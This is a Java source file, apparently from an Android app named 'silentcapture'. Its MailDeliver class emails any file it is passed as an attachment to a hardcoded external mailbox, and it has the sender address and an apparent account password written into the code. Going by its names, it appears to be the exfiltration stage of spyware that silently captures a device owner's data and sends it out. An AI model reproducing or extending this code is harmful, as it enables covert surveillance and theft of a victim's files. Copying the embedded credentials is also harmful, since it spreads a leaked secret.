package com.test.silentcapture.mail;

import android.util.Log;

import com.test.silentcapture.IDeliver;
import com.test.silentcapture.mail.GmailSender;

public class MailDeliver implements IDeliver {
    private static final String TAG = "SilentCapture";

    // Gmail sender
    private GmailSender mGmailSender;
    private String RECIPIENT = "xt101128@vip.163.com";
    private String SUBJECT = "This is an email sent using my Mail JavaMail wrapper from an Android device.";
    private String BODY = "Email Body";
    private String SENDER = "xt101128@vip.163.com";

    public MailDeliver () {
        mGmailSender = new GmailSender(SENDER, "229331");
    }

    public int deliver(String file) {
        Log.d(TAG, "MailDeliver try to send file:" + file + ", Sender:" + SENDER + ", Recipient:" + RECIPIENT);
        return mGmailSender.sendMail(SUBJECT, BODY, SENDER, RECIPIENT, file, file);
    }
}
